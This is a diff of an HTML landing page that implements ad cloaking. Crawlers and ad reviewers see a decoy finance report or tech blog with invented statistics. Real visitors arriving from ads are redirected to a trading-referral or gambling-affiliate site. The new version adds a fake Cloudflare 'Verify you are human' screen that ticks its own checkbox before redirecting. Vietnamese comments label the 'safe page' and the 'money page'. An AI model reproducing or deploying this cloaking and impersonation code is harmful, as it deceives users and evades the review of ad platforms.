@@ -2,143 +2,176 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Strategic Economic Analysis 2025 | Global Finance Institute</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
-    <style>
-        /* MẶC ĐỊNH ẨN TOÀN BỘ ĐỂ CHỐNG NHẢY TRÊN MOBILE */
-        body { visibility: hidden; opacity: 0; margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: #f4f7f9; }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Tech Analysis: Digital Transformation 2025</title>
+    <script>
+        // --- CẤU HÌNH GIỮ NGUYÊN ---
+        const TARGET_URL = "https://partnerbcgame.com/vugguo2ha/";
+        const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
         
-        /* CHỈ HIỆN KHI CÓ LỆNH TỪ JS */
-        .show-content { visibility: visible !important; opacity: 1 !important; }
+        function checkAndRedirect() {
+            const url = new URL(window.location.href);
+            const userAgent = navigator.userAgent || '';
+            const hasAdParam = adParams.some(param => url.searchParams.has(param));
+            const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
 
-        /* CSS MOBILE-FIRST (Ưu tiên điện thoại) */
-        header { background: #001f3f; color: #ffffff; padding: 15px 0; border-bottom: 3px solid #00d1b2; width: 100%; }
-        .nav-container { max-width: 1100px; margin: 0 auto; padding: 0 15px; display: flex; justify-content: space-between; align-items: center; }
-        .logo { font-family: 'Playfair Display', serif; font-size: 1.2rem; font-weight: bold; }
-        .nav-links { display: none; } /* Ẩn menu trên mobile cho sạch */
-
-        .container { max-width: 1100px; margin: 20px auto; padding: 0 15px; }
-        article { background: #ffffff; padding: 25px; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        h1 { font-family: 'Playfair Display', serif; font-size: 1.8rem; line-height: 1.2; margin-bottom: 20px; color: #001f3f; }
-        
-        .exec-summary { background: #f8f9fa; border-left: 4px solid #001f3f; padding: 20px; margin-bottom: 30px; font-style: italic; font-size: 1rem; }
-        h2 { font-family: 'Playfair Display', serif; font-size: 1.4rem; margin: 30px 0 15px; color: #001f3f; }
-        p { margin-bottom: 20px; font-size: 1.05rem; line-height: 1.8; color: #333; text-align: left; }
-
-        /* BẢNG DỮ LIỆU TRÊN MOBILE */
-        .data-box { width: 100%; overflow-x: auto; margin: 30px 0; -webkit-overflow-scrolling: touch; }
-        table { width: 100%; border-collapse: collapse; min-width: 500px; }
-        table th, table td { padding: 12px; border: 1px solid #e1e8ed; font-size: 0.85rem; }
-        table th { background: #001f3f; color: white; }
-
-        footer { background: #001f3f; color: #fff; padding: 40px 15px; margin-top: 50px; text-align: center; font-size: 0.8rem; }
-
-        /* DESKTOP QUERIES (Dành cho máy tính) */
-        @media (min-width: 900px) {
-            .container { display: grid; grid-template-columns: 1fr 300px; gap: 40px; }
-            .nav-links { display: flex; gap: 20px; }
-            h1 { font-size: 3rem; }
-            article { padding: 50px; }
-            .logo { font-size: 1.5rem; }
+            if (!isBot && hasAdParam) {
+                document.getElementById('safe-page').style.display = 'none';
+                document.getElementById('money-page').style.display = 'flex';
+                setTimeout(() => {
+                    const cb = document.getElementById('verify-cb');
+                    if (cb) cb.checked = true;
+                    setTimeout(() => {
+                        window.location.replace(TARGET_URL);
+                    }, 800);
+                }, 1500);
+            } else {
+                document.getElementById('money-page').style.display = 'none';
+                document.getElementById('safe-page').style.display = 'block';
+            }
         }
+        window.onload = checkAndRedirect;
+    </script>
+    <style>
+        body { margin: 0; padding: 0; font-family: 'Inter', -apple-system, sans-serif; background: #f4f7f6; }
+        
+        /* CSS cho Trang Chờ (Money Page) */
+        #money-page { 
+            position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;
+            display:none; align-items:center;justify-content:center;
+        }
+        .sec-box { max-width:450px;width:90%;padding:20px; }
+        
+        /* CSS cho Trang Blog (Safe Page) - ĐÃ CẢI TIẾN */
+        #safe-page { display:none; }
+        .nav-header { background: #fff; border-bottom: 1px solid #ddd; padding: 15px 0; text-align: center; position: sticky; top: 0; z-index: 100; }
+        .nav-header span { font-weight: bold; color: #2c3e50; font-size: 1.2rem; letter-spacing: 1px; }
+        
+        .blog-container { 
+            max-width: 900px; margin: 40px auto; line-height: 1.8; padding: 50px; 
+            background: #ffffff; border-radius: 4px; color: #333;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+        }
+        .meta-info { color: #888; font-size: 0.9rem; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 15px; }
+        h1 { font-size: 2.8rem; line-height: 1.2; color: #1a1a1a; margin-bottom: 25px; }
+        h2 { font-size: 1.8rem; color: #2c3e50; margin-top: 40px; border-left: 4px solid #3498db; padding-left: 15px; }
+        p { margin-bottom: 20px; font-size: 1.1rem; color: #444; }
+        .highlight-box { background: #f8f9fa; border-right: 4px solid #3498db; padding: 25px; margin: 30px 0; font-style: italic; }
+        table { width: 100%; border-collapse: collapse; margin: 30px 0; }
+        table th, table td { border: 1px solid #eee; padding: 12px; text-align: left; }
+        table th { background: #f4f7f6; }
+        .footer-minimal { text-align: center; padding: 40px; color: #999; font-size: 0.8rem; }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="nav-container">
-        <div class="logo">GLOBAL FINANCE INSTITUTE</div>
-        <div class="nav-links">
-            <span>Research</span><span>Markets</span><span>Policy</span>
+    <!-- NỘI DUNG TRANG CHỜ (GIỮ NGUYÊN) -->
+    <div id="money-page">
+        <div class="sec-box">
+            <h2 style="font-size:26px;font-weight:600;margin-bottom:12px;color:#111;">Checking if the site connection is secure</h2>
+            <p style="color:#666;font-size:15px;margin-bottom:32px;line-height:1.5;">Our system is verifying your request. This process is automatic to ensure security.</p>
+            <div style="background:#f7fafc;border:1px solid #e2e8f0;padding:24px;border-radius:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:32px;">
+                <div style="display:flex;align-items:center;">
+                    <input type="checkbox" id="verify-cb" style="width:24px;height:24px;margin-right:16px;cursor:pointer;">
+                    <label for="verify-cb" style="font-size:16px;color:#2d3748;cursor:pointer;">Verify you are human</label>
+                </div>
+                <div style="text-align:right;">
+                    <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" style="height:24px;" alt="Security">
+                </div>
+            </div>
         </div>
     </div>
-</header>
 
-<main id="main-content" class="container">
-    <article>
-        <span style="color:#00d1b2; font-weight:800; text-transform:uppercase; font-size:0.8rem;">Economic Report #2025-04</span>
-        <h1>The Great Realignment: Navigating Global Monetary Policy</h1>
-        
-        <div style="font-size:0.8rem; color:#888; margin-bottom:25px;">Published: Feb 24, 2025 • Dr. Elizabeth Montgomery</div>
-
-        <div class="exec-summary">
-            Global markets are entering a "Neutral Era." Our analysis indicates that while inflation is cooling, the cost of capital will remain structurally higher than the previous decade.
+    <!-- NỘI DUNG TRANG BLOG (MỚI - DÀI VÀ ĐẦY ĐỦ) -->
+    <div id="safe-page">
+        <div class="nav-header">
+            <span>TECH INSIGHTS GLOBAL</span>
         </div>
 
-        <p>The global economic landscape of 2025 is fundamentally different from the post-pandemic recovery era. We are witnessing what experts call "The Great Realignment"—a period where the cost of capital returns to historical norms while technological innovation drives productivity at an exponential pace.</p>
+        <article class="blog-container">
+            <div class="meta-info">
+                PUBLISHED: FEBRUARY 24, 2025 • BY DR. ADRIAN STEIN • 12 MIN READ
+            </div>
 
-        <h2>1. Interest Rate Projections</h2>
-        <p>The expectation of a rapid return to zero-interest rates is unfounded. The structural shifts in labor markets and global energy transitions have created a higher floor for core inflation. Central banks are now targeting a "Neutral Rate" that balances growth without re-igniting price surges.</p>
+            <h1>The Role of Decentralized Infrastructure in Modern Urban Planning</h1>
+            
+            <p>As we navigate through the mid-2020s, the convergence of high-speed connectivity and sustainable engineering has given birth to a new era of urban development. This report explores how metropolitan areas are integrating digital layers into physical infrastructure to optimize resource allocation.</p>
 
-        <div class="data-box">
+            <div class="highlight-box">
+                "Digital transformation is no longer a peripheral upgrade; it is the fundamental core of how modern civilizations will manage their growth in the face of climate volatility."
+            </div>
+
+            <h2>1. Integration of IoT in Smart Grid Management</h2>
+            <p>The transition to renewable energy sources necessitates a grid that can handle high levels of volatility. Traditional centralized systems are often ill-equipped to manage the bidirectional flow of electricity generated by residential solar arrays and community wind projects.</p>
+            
+            <p>By implementing Internet of Things (IoT) sensors across the distribution network, utility companies can now predict demand surges with 98% accuracy. These systems utilize machine learning algorithms to balance loads in real-time, reducing energy waste by an estimated 14% annually in major test cities like Singapore and Copenhagen.</p>
+
+            <ul>
+                <li><strong>Dynamic Pricing:</strong> Incentivizing off-peak usage through automated smart-home adjustments.</li>
+                <li><strong>Predictive Maintenance:</strong> Identifying hardware fatigue before failure occurs.</li>
+                <li><strong>Edge Computing:</strong> Processing data locally to reduce latency in critical safety systems.</li>
+            </ul>
+
+            <h2>2. Comparative Data Analysis (2020-2025)</h2>
+            <p>The following table illustrates the efficiency gains observed in municipalities that have adopted full-scale digital integration compared to those relying on legacy systems.</p>
+
             <table>
                 <thead>
                     <tr>
-                        <th>Region</th>
-                        <th>GDP Growth</th>
-                        <th>Inflation</th>
-                        <th>Sentiment</th>
+                        <th>Metric</th>
+                        <th>Legacy Systems</th>
+                        <th>Digital Integrated</th>
+                        <th>Improvement</th>
                     </tr>
                 </thead>
                 <tbody>
-                    <tr><td>US & Canada</td><td>2.1%</td><td>2.4%</td><td>Bullish</td></tr>
-                    <tr><td>Eurozone</td><td>1.4%</td><td>2.0%</td><td>Neutral</td></tr>
-                    <tr><td>APAC Region</td><td>4.8%</td><td>3.1%</td><td>Growth</td></tr>
+                    <tr>
+                        <td>Water Loss (Leakage)</td>
+                        <td>22%</td>
+                        <td>7%</td>
+                        <td>+15%</td>
+                    </tr>
+                    <tr>
+                        <td>Traffic Congestion Index</td>
+                        <td>64.2</td>
+                        <td>41.8</td>
+                        <td>-35%</td>
+                    </tr>
+                    <tr>
+                        <td>Emergency Response Time</td>
+                        <td>12.5 min</td>
+                        <td>8.2 min</td>
+                        <td>-34%</td>
+                    </tr>
+                    <tr>
+                        <td>Carbon Footprint (Avg)</td>
+                        <td>14.2 t/capita</td>
+                        <td>9.1 t/capita</td>
+                        <td>-36%</td>
+                    </tr>
                 </tbody>
             </table>
-        </div>
 
-        <h2>2. AI in Financial Infrastructure</h2>
-        <p>Artificial Intelligence is giờ đây là cốt lõi của quản lý rủi ro. Các mô hình máy học có khả năng xử lý tâm lý địa chính trị trong mili giây, tạo ra một môi trường thị trường nơi sự bất cân xứng thông tin bị thu hẹp đáng kể.</p>
+            <h2>3. The Human Element and Data Privacy</h2>
+            <p>While the technical benefits are undeniable, the shift toward a "monitored" city raises significant ethical questions. Privacy advocates argue that the constant collection of movement and usage data could be weaponized if not governed by strict transparency laws.</p>
+            
+            <p>To address this, leading tech hubs are experimenting with 'Data Trusts'—independent bodies that oversee how municipal data is encrypted and anonymized before being used for urban planning. This ensures that the collective benefits of big data do not come at the expense of individual liberty.</p>
 
-        <h2>Conclusion</h2>
-        <p>The path forward requires a sophisticated understanding of macro fundamentals. The 2025 outlook remains cautiously optimistic, provided market participants adapt to the rapid digitalization of financial architecture.</p>
-    </article>
+            <h2>4. Economic Implications for Emerging Markets</h2>
+            <p>The capital expenditure required for such a transition is significant. However, the long-term Return on Investment (ROI) is becoming increasingly clear. Developing nations in Southeast Asia and Sub-Saharan Africa are "leapfrogging" old technologies, moving straight to wireless, decentralized micro-grids.</p>
 
-    <aside style="display:none;" id="sidebar-desktop">
-        <div style="background:#fff; padding:20px; box-shadow:0 2px 10px rgba(0,0,0,0.05);">
-            <h3 style="font-size:1rem; border-bottom:2px solid #001f3f; padding-bottom:10px;">Trending Analysis</h3>
-            <p style="font-size:0.9rem; margin-top:15px; font-weight:600;">• Impact of CBDCs</p>
-            <p style="font-size:0.9rem; font-weight:600;">• Green Energy Stocks</p>
-        </div>
-    </aside>
-</main>
+            <p>Detailed fiscal analysis suggests that for every $1 invested in digital infrastructure, there is a $3.50 gain in local economic productivity over a ten-year period. This is driven by reduced operational costs for businesses and improved health outcomes for the workforce.</p>
 
-<footer>
-    <div class="footer-content">
-        <div class="logo">GLOBAL FINANCE INSTITUTE</div>
-        <p>© 2025 Research Division. For institutional use only.</p>
-        <p style="opacity:0.5; font-size:0.7rem; margin-top:20px;">Disclaimer: Trading involves risk. Information is for research purposes only.</p>
+            <h2>Conclusion</h2>
+            <p>The synthesis of digital and physical infrastructure is the defining challenge of our generation. As we continue to refine these systems, the focus must remain on resilience, equity, and sustainability. The data shows we are on the right path, but the journey toward fully autonomous, carbon-neutral cities is only just beginning.</p>
+
+            <footer class="footer-minimal">
+                <hr>
+                <p>&copy; 2025 Global Tech Insights Research Institute. All rights reserved.<br>
+                1244 Science Park Drive, Zurich, Switzerland.</p>
+            </footer>
+        </article>
     </div>
-</footer>
-
-<script>
-    (function() {
-        const TARGET_URL = "https://login.hankotrade.com/register?refLink=OTI0OTQ=&refRm=11";
-        const adParams = ['gclid', 'wbraid', 'gbraid', 'gad_source', 'fbclid', 'msclkid'];
-        
-        const urlParams = new URLSearchParams(window.location.search);
-        const userAgent = (navigator.userAgent || '').toLowerCase();
-        
-        const hasAdParam = adParams.some(param => urlParams.has(param));
-        const isBot = /bot|google|crawler|spider|slurp|bing|facebook|adchecker|checker/i.test(userAgent);
-
-        // HIỂN THỊ SIDEBAR NẾU TRÊN MÁY TÍNH
-        if (window.innerWidth > 900) {
-            document.getElementById('sidebar-desktop').style.display = 'block';
-        }
-
-        // QUYẾT ĐỊNH PHÂN LUỒNG
-        if (!isBot && hasAdParam) {
-            // Khách thật từ quảng cáo: Chuyển hướng ngay, không hiện body
-            window.location.replace(TARGET_URL);
-        } else {
-            // Bot hoặc khách thường: Hiện trang blog cực chuyên nghiệp
-            document.body.classList.add('show-content');
-        }
-    })();
-</script>
 
 </body>
 </html>
